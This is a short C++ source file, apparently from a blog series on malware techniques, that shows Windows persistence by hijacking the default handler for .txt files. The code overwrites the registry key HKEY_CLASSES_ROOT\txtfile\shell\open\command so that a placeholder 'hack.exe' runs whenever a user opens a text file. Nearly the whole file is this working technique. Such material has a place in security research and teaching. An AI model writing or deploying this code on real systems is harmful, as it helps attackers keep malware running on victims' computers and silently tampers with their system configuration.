/*
pers.cpp
windows persistence via
hijacking default file extension
author: @cocomelonc
https://cocomelonc.github.io/malware/2022/08/26/malware-pers-9.html
*/
#include <windows.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

int main(int argc, char* argv[]) {
  HKEY hkey = NULL;

  // command for replace
  // "%SystemRoot%\\system32\\NOTEPAD.EXE %1"
  // malicious app
  const char* cmd = "Z:\\2022-08-26-malware-pers-9\\hack.exe";

  // hijacking logic
  LONG res = RegOpenKeyEx(HKEY_CLASSES_ROOT, (LPCSTR)"\\txtfile\\shell\\open\\command", 0 , KEY_WRITE, &hkey);
  if (res == ERROR_SUCCESS) {
    // update key
    RegSetValueEx(hkey, (LPCSTR)"", 0, REG_SZ, (unsigned char*)cmd, strlen(cmd));
    RegCloseKey(hkey);
  }
  return 0;
}
